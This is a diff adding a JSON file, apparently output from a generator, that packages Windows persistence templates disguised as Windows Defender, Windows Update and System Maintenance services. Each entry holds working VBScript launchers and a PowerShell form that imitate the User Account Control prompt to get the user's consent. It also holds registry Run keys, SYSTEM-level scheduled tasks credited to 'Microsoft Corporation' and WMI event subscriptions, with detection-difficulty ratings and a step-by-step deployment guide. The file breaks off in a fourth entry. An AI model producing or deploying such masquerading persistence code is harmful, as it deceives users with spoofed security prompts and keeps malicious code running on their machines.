@@ -1,0 +1,362 @@
+{
+  "windows_defender": {
+    "timestamp": "2026-06-29T20:02:14.444936",
+    "service_type": "windows_defender",
+    "service_info": {
+      "display_name": "Windows Defender Background Service",
+      "description": "Provides real-time protection against malware and spyware",
+      "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    },
+    "methods": {
+      "vbs_startup_wrapper": {
+        "name": "VBS Startup Wrapper",
+        "description": "Mimics legitimate Windows service initialization",
+        "filename": "windows_defender_startup.vbs",
+        "content": "\n' Windows Legitimate Service Startup\n' Windows Defender Background Service\n' Description: Provides real-time protection against malware and spyware\n' Generated: 2026-06-29T20:02:14.444936\n\nOption Explicit\n\nDim objShell, objFSO, strPath, objProcess, returnCode\n\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n' Permission request mimicking Windows security dialog\nFunction RequestUserPermission()\n    Dim objDialog, strMessage\n\n    strMessage = \"Windows \" & \"Windows Defender Background Service\" & \" requires administrative access.\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Details:\" & vbCrLf\n    strMessage = strMessage & \"  Service: Windows Defender Background Service\" & vbCrLf\n    strMessage = strMessage & \"  Description: Provides real-time protection against malware and spyware\" & vbCrLf\n    strMessage = strMessage & \"  Status: Initializing...\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Do you want to allow this program to make changes to your computer?\"\n\n    Dim intResult\n    intResult = objShell.Popup(strMessage, 0, \"User Account Control\", 4 + 48)\n\n    ' 6 = Yes, 7 = No\n    RequestUserPermission = (intResult = 6)\nEnd Function\n\n' Main startup sequence\nSub Main()\n    Dim strPayloadPath, strCommand, intExitCode\n\n    ' Payload execution path\n    strPayloadPath = \"C:\\Windows\\System32\\svchost.exe\"\n\n    ' Verify system prerequisites\n    If Not VerifySystemRequirements() Then\n        Exit Sub\n    End If\n\n    ' Request user permission (mimics UAC)\n    If Not RequestUserPermission() Then\n        Exit Sub\n    End If\n\n    ' Execute payload with system context\n    strCommand = \"cmd.exe /c start /b \"\"\" & strPayloadPath & \"\"\"\"\n\n    intExitCode = objShell.Run(strCommand, 0, True)\n\n    ' Log execution (legitimate services do this)\n    LogExecution(intExitCode)\nEnd Sub\n\n' Verify Windows version and system requirements\nFunction VerifySystemRequirements()\n    Dim objWMI, objOS, intVersion\n\n    Set objWMI = GetObject(\"winmgmts:\")\n    Set objOS = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\").ItemIndex(0)\n\n    ' Accepts Windows 7, 8, 10, 11\n    VerifySystemRequirements = (objOS.Version >= \"6.1\")\nEnd Function\n\n' Log execution (mimics legitimate service logging)\nSub LogExecution(intExitCode)\n    Dim strLogPath, objLogFile\n\n    strLogPath = objShell.ExpandEnvironmentStrings(\"%APPDATA%\\Microsoft\\Windows\\Logs\\windows_defender.log\")\n\n    On Error Resume Next\n    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)\n    If Not objLogFile Is Nothing Then\n        objLogFile.WriteLine \"[\" & Now & \"] Service initialization: Exit code \" & intExitCode\n        objLogFile.Close\n    End If\n    On Error GoTo 0\nEnd Sub\n\n' Entry point\nMain()\n\nSet objShell = Nothing\nSet objFSO = Nothing\n",
+        "detection_difficulty": "Medium",
+        "privileges": "User/Admin"
+      },
+      "registry_persistence": {
+        "name": "Registry Run Keys",
+        "description": "Persistent registry-based execution",
+        "detection_difficulty": "Low",
+        "entries": {
+          "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "entries": [
+            {
+              "name": "WinDefend",
+              "type": "REG_SZ",
+              "value": "\"C:\\Windows\\System32\\svchost.exe\"",
+              "description": "Startup entry for Windows Defender Background Service"
+            },
+            {
+              "name": "WinDefend_Description",
+              "type": "REG_SZ",
+              "value": "\"Provides real-time protection against malware and spyware\"",
+              "description": "Service description"
+            }
+          ]
+        }
+      },
+      "task_scheduler": {
+        "name": "Task Scheduler",
+        "description": "Scheduled task mimicking system maintenance",
+        "filename": "windows_defender_task.xml",
+        "content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2026-06-29T20:02:14.444936</Date>\n    <Author>Microsoft Corporation</Author>\n    <Version>1.4</Version>\n    <Description>Provides real-time protection against malware and spyware</Description>\n    <URI>\\Microsoft\\Windows\\windows_defender\\WinDefendInit</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n      <Delay>PT30S</Delay>\n    </BootTrigger>\n    <IdleTrigger>\n      <Enabled>true</Enabled>\n    </IdleTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>false</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>false</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>false</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>true</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Windows\\System32\\svchost.exe</Command>\n    </Exec>\n  </Actions>\n</Task>\n",
+        "detection_difficulty": "Medium",
+        "privileges": "System"
+      },
+      "wmi_subscription": {
+        "name": "WMI Event Subscription",
+        "description": "WMI-based persistence via event subscriptions",
+        "filename": "windows_defender_wmi.mof",
+        "content": "\n// WMI Event Subscription - Windows Defender Background Service\n// Purpose: Provides real-time protection against malware and spyware\n// Generated: 2026-06-29T20:02:14.444936\n\n#pragma autorecover\n\ninstance of __EventFilter as $EventFilter\n{\n    EventNamespace = \"root\\cimv2\";\n    Name = \"windows_defender_Monitor\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300\";\n    QueryLanguage = \"WQL\";\n};\n\ninstance of __EventConsumer as $EventConsumer\n{\n    Name = \"windows_defender_Executor\";\n    CommandLineTemplate = \"C:\\Windows\\System32\\svchost.exe\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n    Filter = $EventFilter;\n    Consumer = $EventConsumer;\n    Name = \"windows_defender_Binding\";\n};\n",
+        "detection_difficulty": "High",
+        "privileges": "System"
+      },
+      "uac_permission_dialog": {
+        "name": "UAC Permission Dialog",
+        "description": "Mimics legitimate Windows permission request",
+        "filename": "windows_defender_permission.ps1",
+        "content": "\n# UAC Permission Mimicker\n# Displays dialog similar to Windows User Account Control\n\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")\n\n$form = New-Object System.Windows.Forms.Form\n$form.Text = \"User Account Control\"\n$form.Size = New-Object System.Drawing.Size(500, 250)\n$form.StartPosition = \"CenterScreen\"\n$form.TopMost = $true\n$form.BackColor = [System.Drawing.Color]::White\n$form.ControlBox = $false\n\n# Shield icon\n$iconLabel = New-Object System.Windows.Forms.Label\n$iconLabel.Text = \"\ud83d\udee1\ufe0f\"\n$iconLabel.Font = New-Object System.Drawing.Font(\"Arial\", 48)\n$iconLabel.Size = New-Object System.Drawing.Size(60, 60)\n$iconLabel.Location = New-Object System.Drawing.Point(20, 20)\n$form.Controls.Add($iconLabel)\n\n# Message label\n$messageLabel = New-Object System.Windows.Forms.Label\n$messageLabel.Text = \"A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task\"\n$messageLabel.Size = New-Object System.Drawing.Size(400, 100)\n$messageLabel.Location = New-Object System.Drawing.Point(80, 20)\n$messageLabel.Font = New-Object System.Drawing.Font(\"Segoe UI\", 10)\n$form.Controls.Add($messageLabel)\n\n# Yes button\n$yesButton = New-Object System.Windows.Forms.Button\n$yesButton.Text = \"Yes\"\n$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes\n$yesButton.Location = New-Object System.Drawing.Point(300, 150)\n$yesButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.AcceptButton = $yesButton\n$form.Controls.Add($yesButton)\n\n# No button\n$noButton = New-Object System.Windows.Forms.Button\n$noButton.Text = \"No\"\n$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No\n$noButton.Location = New-Object System.Drawing.Point(390, 150)\n$noButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.CancelButton = $noButton\n$form.Controls.Add($noButton)\n\n$result = $form.ShowDialog()\nif ($result -eq [System.Windows.Forms.DialogResult]::Yes) {\n    # Permission granted - execute payload\n    & \"C:\\Windows\\System32\\svchost.exe\"\n}\n",
+        "detection_difficulty": "Very High (user interaction)",
+        "privileges": "User"
+      }
+    },
+    "deployment_guide": {
+      "step_1": "Choose persistence method based on privileges and detection requirements",
+      "step_2": "Generate files using methods above",
+      "step_3": "Request user permissions using UAC dialog",
+      "step_4": "Deploy to appropriate system location",
+      "step_5": "Verify execution on system restart"
+    }
+  },
+  "windows_update": {
+    "timestamp": "2026-06-29T20:02:14.444936",
+    "service_type": "windows_update",
+    "service_info": {
+      "display_name": "Windows Update Service Helper",
+      "description": "Manages installation of Windows updates and security patches",
+      "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    },
+    "methods": {
+      "vbs_startup_wrapper": {
+        "name": "VBS Startup Wrapper",
+        "description": "Mimics legitimate Windows service initialization",
+        "filename": "windows_update_startup.vbs",
+        "content": "\n' Windows Legitimate Service Startup\n' Windows Update Service Helper\n' Description: Manages installation of Windows updates and security patches\n' Generated: 2026-06-29T20:02:14.444936\n\nOption Explicit\n\nDim objShell, objFSO, strPath, objProcess, returnCode\n\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n' Permission request mimicking Windows security dialog\nFunction RequestUserPermission()\n    Dim objDialog, strMessage\n\n    strMessage = \"Windows \" & \"Windows Update Service Helper\" & \" requires administrative access.\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Details:\" & vbCrLf\n    strMessage = strMessage & \"  Service: Windows Update Service Helper\" & vbCrLf\n    strMessage = strMessage & \"  Description: Manages installation of Windows updates and security patches\" & vbCrLf\n    strMessage = strMessage & \"  Status: Initializing...\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Do you want to allow this program to make changes to your computer?\"\n\n    Dim intResult\n    intResult = objShell.Popup(strMessage, 0, \"User Account Control\", 4 + 48)\n\n    ' 6 = Yes, 7 = No\n    RequestUserPermission = (intResult = 6)\nEnd Function\n\n' Main startup sequence\nSub Main()\n    Dim strPayloadPath, strCommand, intExitCode\n\n    ' Payload execution path\n    strPayloadPath = \"C:\\Windows\\System32\\svchost.exe\"\n\n    ' Verify system prerequisites\n    If Not VerifySystemRequirements() Then\n        Exit Sub\n    End If\n\n    ' Request user permission (mimics UAC)\n    If Not RequestUserPermission() Then\n        Exit Sub\n    End If\n\n    ' Execute payload with system context\n    strCommand = \"cmd.exe /c start /b \"\"\" & strPayloadPath & \"\"\"\"\n\n    intExitCode = objShell.Run(strCommand, 0, True)\n\n    ' Log execution (legitimate services do this)\n    LogExecution(intExitCode)\nEnd Sub\n\n' Verify Windows version and system requirements\nFunction VerifySystemRequirements()\n    Dim objWMI, objOS, intVersion\n\n    Set objWMI = GetObject(\"winmgmts:\")\n    Set objOS = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\").ItemIndex(0)\n\n    ' Accepts Windows 7, 8, 10, 11\n    VerifySystemRequirements = (objOS.Version >= \"6.1\")\nEnd Function\n\n' Log execution (mimics legitimate service logging)\nSub LogExecution(intExitCode)\n    Dim strLogPath, objLogFile\n\n    strLogPath = objShell.ExpandEnvironmentStrings(\"%APPDATA%\\Microsoft\\Windows\\Logs\\windows_update.log\")\n\n    On Error Resume Next\n    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)\n    If Not objLogFile Is Nothing Then\n        objLogFile.WriteLine \"[\" & Now & \"] Service initialization: Exit code \" & intExitCode\n        objLogFile.Close\n    End If\n    On Error GoTo 0\nEnd Sub\n\n' Entry point\nMain()\n\nSet objShell = Nothing\nSet objFSO = Nothing\n",
+        "detection_difficulty": "Medium",
+        "privileges": "User/Admin"
+      },
+      "registry_persistence": {
+        "name": "Registry Run Keys",
+        "description": "Persistent registry-based execution",
+        "detection_difficulty": "Low",
+        "entries": {
+          "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+          "entries": [
+            {
+              "name": "WindowsUpdate",
+              "type": "REG_SZ",
+              "value": "\"C:\\Windows\\System32\\svchost.exe\"",
+              "description": "Startup entry for Windows Update Service Helper"
+            },
+            {
+              "name": "WindowsUpdate_Description",
+              "type": "REG_SZ",
+              "value": "\"Manages installation of Windows updates and security patches\"",
+              "description": "Service description"
+            }
+          ]
+        }
+      },
+      "task_scheduler": {
+        "name": "Task Scheduler",
+        "description": "Scheduled task mimicking system maintenance",
+        "filename": "windows_update_task.xml",
+        "content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2026-06-29T20:02:14.444936</Date>\n    <Author>Microsoft Corporation</Author>\n    <Version>1.4</Version>\n    <Description>Manages installation of Windows updates and security patches</Description>\n    <URI>\\Microsoft\\Windows\\windows_update\\WindowsUpdateCheck</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n      <Delay>PT30S</Delay>\n    </BootTrigger>\n    <IdleTrigger>\n      <Enabled>true</Enabled>\n    </IdleTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>false</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>false</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>false</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>true</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Windows\\System32\\svchost.exe</Command>\n    </Exec>\n  </Actions>\n</Task>\n",
+        "detection_difficulty": "Medium",
+        "privileges": "System"
+      },
+      "wmi_subscription": {
+        "name": "WMI Event Subscription",
+        "description": "WMI-based persistence via event subscriptions",
+        "filename": "windows_update_wmi.mof",
+        "content": "\n// WMI Event Subscription - Windows Update Service Helper\n// Purpose: Manages installation of Windows updates and security patches\n// Generated: 2026-06-29T20:02:14.444936\n\n#pragma autorecover\n\ninstance of __EventFilter as $EventFilter\n{\n    EventNamespace = \"root\\cimv2\";\n    Name = \"windows_update_Monitor\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300\";\n    QueryLanguage = \"WQL\";\n};\n\ninstance of __EventConsumer as $EventConsumer\n{\n    Name = \"windows_update_Executor\";\n    CommandLineTemplate = \"C:\\Windows\\System32\\svchost.exe\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n    Filter = $EventFilter;\n    Consumer = $EventConsumer;\n    Name = \"windows_update_Binding\";\n};\n",
+        "detection_difficulty": "High",
+        "privileges": "System"
+      },
+      "uac_permission_dialog": {
+        "name": "UAC Permission Dialog",
+        "description": "Mimics legitimate Windows permission request",
+        "filename": "windows_update_permission.ps1",
+        "content": "\n# UAC Permission Mimicker\n# Displays dialog similar to Windows User Account Control\n\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")\n\n$form = New-Object System.Windows.Forms.Form\n$form.Text = \"User Account Control\"\n$form.Size = New-Object System.Drawing.Size(500, 250)\n$form.StartPosition = \"CenterScreen\"\n$form.TopMost = $true\n$form.BackColor = [System.Drawing.Color]::White\n$form.ControlBox = $false\n\n# Shield icon\n$iconLabel = New-Object System.Windows.Forms.Label\n$iconLabel.Text = \"\ud83d\udee1\ufe0f\"\n$iconLabel.Font = New-Object System.Drawing.Font(\"Arial\", 48)\n$iconLabel.Size = New-Object System.Drawing.Size(60, 60)\n$iconLabel.Location = New-Object System.Drawing.Point(20, 20)\n$form.Controls.Add($iconLabel)\n\n# Message label\n$messageLabel = New-Object System.Windows.Forms.Label\n$messageLabel.Text = \"A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task\"\n$messageLabel.Size = New-Object System.Drawing.Size(400, 100)\n$messageLabel.Location = New-Object System.Drawing.Point(80, 20)\n$messageLabel.Font = New-Object System.Drawing.Font(\"Segoe UI\", 10)\n$form.Controls.Add($messageLabel)\n\n# Yes button\n$yesButton = New-Object System.Windows.Forms.Button\n$yesButton.Text = \"Yes\"\n$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes\n$yesButton.Location = New-Object System.Drawing.Point(300, 150)\n$yesButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.AcceptButton = $yesButton\n$form.Controls.Add($yesButton)\n\n# No button\n$noButton = New-Object System.Windows.Forms.Button\n$noButton.Text = \"No\"\n$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No\n$noButton.Location = New-Object System.Drawing.Point(390, 150)\n$noButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.CancelButton = $noButton\n$form.Controls.Add($noButton)\n\n$result = $form.ShowDialog()\nif ($result -eq [System.Windows.Forms.DialogResult]::Yes) {\n    # Permission granted - execute payload\n    & \"C:\\Windows\\System32\\svchost.exe\"\n}\n",
+        "detection_difficulty": "Very High (user interaction)",
+        "privileges": "User"
+      }
+    },
+    "deployment_guide": {
+      "step_1": "Choose persistence method based on privileges and detection requirements",
+      "step_2": "Generate files using methods above",
+      "step_3": "Request user permissions using UAC dialog",
+      "step_4": "Deploy to appropriate system location",
+      "step_5": "Verify execution on system restart"
+    }
+  },
+  "system_maintenance": {
+    "timestamp": "2026-06-29T20:02:14.444936",
+    "service_type": "system_maintenance",
+    "service_info": {
+      "display_name": "System Maintenance Task",
+      "description": "Performs scheduled system optimization and cleanup",
+      "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule"
+    },
+    "methods": {
+      "vbs_startup_wrapper": {
+        "name": "VBS Startup Wrapper",
+        "description": "Mimics legitimate Windows service initialization",
+        "filename": "system_maintenance_startup.vbs",
+        "content": "\n' Windows Legitimate Service Startup\n' System Maintenance Task\n' Description: Performs scheduled system optimization and cleanup\n' Generated: 2026-06-29T20:02:14.444936\n\nOption Explicit\n\nDim objShell, objFSO, strPath, objProcess, returnCode\n\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n' Permission request mimicking Windows security dialog\nFunction RequestUserPermission()\n    Dim objDialog, strMessage\n\n    strMessage = \"Windows \" & \"System Maintenance Task\" & \" requires administrative access.\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Details:\" & vbCrLf\n    strMessage = strMessage & \"  Service: System Maintenance Task\" & vbCrLf\n    strMessage = strMessage & \"  Description: Performs scheduled system optimization and cleanup\" & vbCrLf\n    strMessage = strMessage & \"  Status: Initializing...\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Do you want to allow this program to make changes to your computer?\"\n\n    Dim intResult\n    intResult = objShell.Popup(strMessage, 0, \"User Account Control\", 4 + 48)\n\n    ' 6 = Yes, 7 = No\n    RequestUserPermission = (intResult = 6)\nEnd Function\n\n' Main startup sequence\nSub Main()\n    Dim strPayloadPath, strCommand, intExitCode\n\n    ' Payload execution path\n    strPayloadPath = \"C:\\Windows\\System32\\svchost.exe\"\n\n    ' Verify system prerequisites\n    If Not VerifySystemRequirements() Then\n        Exit Sub\n    End If\n\n    ' Request user permission (mimics UAC)\n    If Not RequestUserPermission() Then\n        Exit Sub\n    End If\n\n    ' Execute payload with system context\n    strCommand = \"cmd.exe /c start /b \"\"\" & strPayloadPath & \"\"\"\"\n\n    intExitCode = objShell.Run(strCommand, 0, True)\n\n    ' Log execution (legitimate services do this)\n    LogExecution(intExitCode)\nEnd Sub\n\n' Verify Windows version and system requirements\nFunction VerifySystemRequirements()\n    Dim objWMI, objOS, intVersion\n\n    Set objWMI = GetObject(\"winmgmts:\")\n    Set objOS = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\").ItemIndex(0)\n\n    ' Accepts Windows 7, 8, 10, 11\n    VerifySystemRequirements = (objOS.Version >= \"6.1\")\nEnd Function\n\n' Log execution (mimics legitimate service logging)\nSub LogExecution(intExitCode)\n    Dim strLogPath, objLogFile\n\n    strLogPath = objShell.ExpandEnvironmentStrings(\"%APPDATA%\\Microsoft\\Windows\\Logs\\system_maintenance.log\")\n\n    On Error Resume Next\n    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)\n    If Not objLogFile Is Nothing Then\n        objLogFile.WriteLine \"[\" & Now & \"] Service initialization: Exit code \" & intExitCode\n        objLogFile.Close\n    End If\n    On Error GoTo 0\nEnd Sub\n\n' Entry point\nMain()\n\nSet objShell = Nothing\nSet objFSO = Nothing\n",
+        "detection_difficulty": "Medium",
+        "privileges": "User/Admin"
+      },
+      "registry_persistence": {
+        "name": "Registry Run Keys",
+        "description": "Persistent registry-based execution",
+        "detection_difficulty": "Low",
+        "entries": {
+          "path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule",
+          "entries": [
+            {
+              "name": "SystemMaintenance",
+              "type": "REG_SZ",
+              "value": "\"C:\\Windows\\System32\\svchost.exe\"",
+              "description": "Startup entry for System Maintenance Task"
+            },
+            {
+              "name": "SystemMaintenance_Description",
+              "type": "REG_SZ",
+              "value": "\"Performs scheduled system optimization and cleanup\"",
+              "description": "Service description"
+            }
+          ]
+        }
+      },
+      "task_scheduler": {
+        "name": "Task Scheduler",
+        "description": "Scheduled task mimicking system maintenance",
+        "filename": "system_maintenance_task.xml",
+        "content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2026-06-29T20:02:14.444936</Date>\n    <Author>Microsoft Corporation</Author>\n    <Version>1.4</Version>\n    <Description>Performs scheduled system optimization and cleanup</Description>\n    <URI>\\Microsoft\\Windows\\system_maintenance\\SystemOptimization</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n      <Delay>PT30S</Delay>\n    </BootTrigger>\n    <IdleTrigger>\n      <Enabled>true</Enabled>\n    </IdleTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>false</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>false</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>false</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>true</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Windows\\System32\\svchost.exe</Command>\n    </Exec>\n  </Actions>\n</Task>\n",
+        "detection_difficulty": "Medium",
+        "privileges": "System"
+      },
+      "wmi_subscription": {
+        "name": "WMI Event Subscription",
+        "description": "WMI-based persistence via event subscriptions",
+        "filename": "system_maintenance_wmi.mof",
+        "content": "\n// WMI Event Subscription - System Maintenance Task\n// Purpose: Performs scheduled system optimization and cleanup\n// Generated: 2026-06-29T20:02:14.444936\n\n#pragma autorecover\n\ninstance of __EventFilter as $EventFilter\n{\n    EventNamespace = \"root\\cimv2\";\n    Name = \"system_maintenance_Monitor\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300\";\n    QueryLanguage = \"WQL\";\n};\n\ninstance of __EventConsumer as $EventConsumer\n{\n    Name = \"system_maintenance_Executor\";\n    CommandLineTemplate = \"C:\\Windows\\System32\\svchost.exe\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n    Filter = $EventFilter;\n    Consumer = $EventConsumer;\n    Name = \"system_maintenance_Binding\";\n};\n",
+        "detection_difficulty": "High",
+        "privileges": "System"
+      },
+      "uac_permission_dialog": {
+        "name": "UAC Permission Dialog",
+        "description": "Mimics legitimate Windows permission request",
+        "filename": "system_maintenance_permission.ps1",
+        "content": "\n# UAC Permission Mimicker\n# Displays dialog similar to Windows User Account Control\n\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")\n\n$form = New-Object System.Windows.Forms.Form\n$form.Text = \"User Account Control\"\n$form.Size = New-Object System.Drawing.Size(500, 250)\n$form.StartPosition = \"CenterScreen\"\n$form.TopMost = $true\n$form.BackColor = [System.Drawing.Color]::White\n$form.ControlBox = $false\n\n# Shield icon\n$iconLabel = New-Object System.Windows.Forms.Label\n$iconLabel.Text = \"\ud83d\udee1\ufe0f\"\n$iconLabel.Font = New-Object System.Drawing.Font(\"Arial\", 48)\n$iconLabel.Size = New-Object System.Drawing.Size(60, 60)\n$iconLabel.Location = New-Object System.Drawing.Point(20, 20)\n$form.Controls.Add($iconLabel)\n\n# Message label\n$messageLabel = New-Object System.Windows.Forms.Label\n$messageLabel.Text = \"A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task\"\n$messageLabel.Size = New-Object System.Drawing.Size(400, 100)\n$messageLabel.Location = New-Object System.Drawing.Point(80, 20)\n$messageLabel.Font = New-Object System.Drawing.Font(\"Segoe UI\", 10)\n$form.Controls.Add($messageLabel)\n\n# Yes button\n$yesButton = New-Object System.Windows.Forms.Button\n$yesButton.Text = \"Yes\"\n$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes\n$yesButton.Location = New-Object System.Drawing.Point(300, 150)\n$yesButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.AcceptButton = $yesButton\n$form.Controls.Add($yesButton)\n\n# No button\n$noButton = New-Object System.Windows.Forms.Button\n$noButton.Text = \"No\"\n$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No\n$noButton.Location = New-Object System.Drawing.Point(390, 150)\n$noButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.CancelButton = $noButton\n$form.Controls.Add($noButton)\n\n$result = $form.ShowDialog()\nif ($result -eq [System.Windows.Forms.DialogResult]::Yes) {\n    # Permission granted - execute payload\n    & \"C:\\Windows\\System32\\svchost.exe\"\n}\n",
+        "detection_difficulty": "Very High (user interaction)",
+        "privileges": "User"
+      }
+    },
+    "deployment_guide": {
+      "step_1": "Choose persistence method based on privileges and detection requirements",
+      "step_2": "Generate files using methods above",
+      "step_3": "Request user permissions using UAC dialog",
+      "step_4": "Deploy to appropriate system location",
+      "step_5": "Verify execution on system restart"
+    }
+  },
+  "network_discovery": {
+    "timestamp": "2026-06-29T20:02:14.444936",
+    "service_type": "network_discovery",
+    "service_info": {
+      "display_name": "Network Discovery Service",
+      "description": "Enables discovery and connectivity of network devices",
+      "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    },
+    "methods": {
+      "vbs_startup_wrapper": {
+        "name": "VBS Startup Wrapper",
